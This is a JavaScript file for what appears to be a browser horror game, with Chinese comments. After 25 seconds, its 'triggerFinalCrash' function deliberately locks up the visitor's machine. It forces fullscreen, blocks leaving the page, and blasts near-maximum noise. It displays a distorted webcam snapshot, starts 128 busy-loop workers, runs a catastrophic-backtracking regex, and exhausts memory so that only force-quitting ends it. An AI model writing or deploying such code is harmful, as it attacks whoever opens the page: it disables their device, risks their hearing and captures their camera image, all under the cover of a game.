/* PROJECT: RYUGYONG-26 / ABSOLUTE DEADLOCK
   STATUS: SYSTEM HIJACK ENABLED
   WARNING: THIS WILL REQUIRE TASK MANAGER (WIN) OR FORCE QUIT (MAC) TO TERMINATE.
*/

let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let videoStream = null;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 攝像頭權限預備 (Soul Access)
async function setupCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoStream = stream;
    } catch (err) {
        console.log("Access denied. The void will be empty.");
    }
}

// 2. 音頻系統 (Glitch -> White Noise Bomb)
function startCreepyVoice() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                // 崩潰後：極大聲隨機噪音
                output[i] = (Math.random() * 2 - 1) * 0.98;
            } else {
                // 崩潰前：數位呼吸聲
                let g = (t & (t >> 8)) ? 0.05 : -0.05;
                output[i] = (Math.random() * 0.05) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// 3. 自動獵殺：白色靈魂 (Auto-Homing Soul)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    const side = Math.floor(Math.random() * 4);
    let startX, startY;
    if (side === 0) { startX = -100; startY = Math.random() * window.innerHeight; }
    else if (side === 1) { startX = window.innerWidth + 100; startY = Math.random() * window.innerHeight; }
    else if (side === 2) { startX = Math.random() * window.innerWidth; startY = -100; }
    else { startX = Math.random() * window.innerWidth; startY = window.innerHeight + 100; }

    glitchBlock.style.cssText = `
        position: fixed; width: 40px; height: 40px;
        background: white; z-index: 10001;
        left: ${startX}px; top: ${startY}px;
        box-shadow: 0 0 40px 10px white;
        transition: transform 0.05s linear;
        pointer-events: none;
    `;
    document.body.appendChild(glitchBlock);

    let currentX = startX, currentY = startY;
    const speed = 4.8; 

    const hunterInterval = setInterval(() => {
        if (systemCrashed) { clearInterval(hunterInterval); return; }
        const centerX = window.innerWidth / 2, centerY = window.innerHeight / 2;
        const dx = centerX - (currentX + 20), dy = centerY - (currentY + 20);
        const distance = Math.sqrt(dx * dx + dy * dy);

        if (distance < 35) {
            triggerFinalCrash();
            glitchBlock.remove();
            clearInterval(hunterInterval);
        } else {
            currentX += (dx / distance) * speed;
            currentY += (dy / distance) * speed;
            glitchBlock.style.left = `${currentX}px`;
            glitchBlock.style.top = `${currentY}px`;
            const scale = 1 + (250 / distance); 
            glitchBlock.style.transform = `scale(${scale})`;
        }
    }, 16);
}, 25000); 

// 4. 攝像頭奪魂 (Distortion)
function captureAndDistort() {
    if (!videoStream) return;
    const canvas = document.createElement('canvas');
    const video = document.createElement('video');
    video.srcObject = videoStream;
    video.play();

    setTimeout(() => {
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        ctx.filter = 'grayscale(100%) contrast(1000%) brightness(25%) invert(5%)';
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const dataUrl = canvas.toDataURL('image/jpeg');
        const ds = document.getElementById('death-screen');
        if (ds) {
            ds.style.backgroundImage = `url(${dataUrl})`;
            ds.style.backgroundSize = 'cover';
        }
        videoStream.getTracks().forEach(t => t.stop());
    }, 50);
}

// 5. 核心：Roblox 級別死鎖 (Absolute Deadlock)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // A. 立即切換 UI (視覺先行)
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red; margin:0;">HELP ME.</h1>
        </div>
    `;

    // B. 執行拍照
    captureAndDistort();

    // C. 請求全屏 (隱藏瀏覽器 UI)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    // D. 攔截所有退出動作
    window.onbeforeunload = () => "I AM INSIDE.";

    // E. 啟動毀滅循環
    setTimeout(() => {
        // 1. 音頻過載炸彈
        const ac = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(() => {
            let o = ac.createOscillator();
            o.type = 'sawtooth'; o.frequency.value = 50 + Math.random() * 7000;
            o.connect(ac.destination); o.start();
        }, 25);

        // 2. 硬件佔用 (128 Workers)
        const b = new Blob([`while(true){postMessage(0)}`], {type:'text/javascript'});
        const u = URL.createObjectURL(b);
        for(let i=0; i<128; i++) new Worker(u);

        // 3. 核心死鎖：RegExp 炸彈 + 同步阻塞 (Roblox 模式)
        const vault = [];
        function deadlock() {
            // 正則表達式災難性回溯 - 鎖死 CPU
            const bomb = /^(a+)+$/;
            bomb.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); 

            // 劫持歷史紀錄與消耗內存
            for(let i=0; i<50; i++) {
                vault.push(new BigUint64Array(1024 * 1024)); 
                window.history.pushState(null, null, "#" + Math.random());
            }

            // 同步死循環：強制鎖死主線程 3 秒，不讓系統處理關閉事件
            const start = Date.now();
            while(Date.now() - start < 3000) { Math.sqrt(Math.random()); } 

            // 遞迴微任務隊列：插隊所有 UI 操作 (使 X 掣失靈)
            Promise.resolve().then(deadlock);
        }
        deadlock();
    }, 100);
}

// 6. 交互邏輯
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
});

window.addEventListener('touchstart', (e) => {
    if (!audioStarted) {
        setupCamera(); startCreepyVoice();
        intro.style.display = 'none';
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
    }
    if (!systemCrashed) posY += 40;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});

window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    let k = e.key.toLowerCase();
    if (k === 'f') { 
        setupCamera(); startCreepyVoice();
        intro.style.display = 'none'; 
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
    }
    if (k === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'black';
    }
    const spd = 60;
    if (k === 'w') posY += spd; if (k === 's') posY -= spd;
    if (k === 'a') posX += spd; if (k === 'd') posX -= spd;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
